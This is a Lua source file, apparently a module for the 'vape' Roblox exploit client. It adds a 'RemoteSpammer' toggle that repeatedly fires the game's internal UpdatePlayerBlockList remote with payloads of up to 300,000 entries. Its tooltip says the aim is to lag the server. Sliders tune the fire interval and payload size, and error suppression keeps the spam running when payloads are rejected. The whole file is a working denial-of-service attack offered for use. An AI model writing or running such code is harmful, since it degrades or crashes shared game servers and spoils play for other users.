local RemoteSpammer
local Threshold
local Payload
local payload
local payloadSize

-- the size of the payload is what makes each fire expensive, so it is only rebuilt
-- when the slider moves
local function getPayload()
	if not payload or payloadSize ~= Payload.Value then
		payloadSize = Payload.Value
		payload = table.create(payloadSize)
		for index = 1, payloadSize do
			payload[index] = {id = index, v = index * 2}
		end
	end

	return payload
end

local function getRemote()
	local container = game:FindFirstChild('RobloxReplicatedStorage')
	local remote = container and container:FindFirstChild('UpdatePlayerBlockList')
	return remote and cloneref(remote)
end

RemoteSpammer = vape.Categories.World:CreateModule({
	Name = 'RemoteSpammer',
	Function = function(callback)
		if callback then
			local fireDelay = os.clock()
			notif('RemoteSpammer', 'Spamming the block list remote.', 5)

			repeat
				local remote = getRemote()
				local now = os.clock()
				if remote and fireDelay < now then
					fireDelay = now + Threshold.Value
					-- a payload this large can be rejected, which must not kill the spam
					pcall(remote.FireServer, remote, getPayload())
				end

				runService.Heartbeat:Wait()
			until not RemoteSpammer.Enabled
		else
			payload = nil -- not worth holding a payload this size while the module is off
		end
	end,
	Tooltip = 'Spams the UpdatePlayerBlockList remote with a huge payload to lag the server.'
})
Threshold = RemoteSpammer:CreateSlider({
	Name = 'Threshold',
	Min = 0,
	Max = 1,
	Default = 0.1,
	Decimal = 100,
	Tooltip = 'Seconds between each fire, 0 fires as fast as the loop runs.'
})
Payload = RemoteSpammer:CreateSlider({
	Name = 'Payload',
	Min = 1000,
	Max = 300000,
	Default = 150000,
	Tooltip = 'Entries in each payload, bigger is heavier but more likely to be rejected.'
})
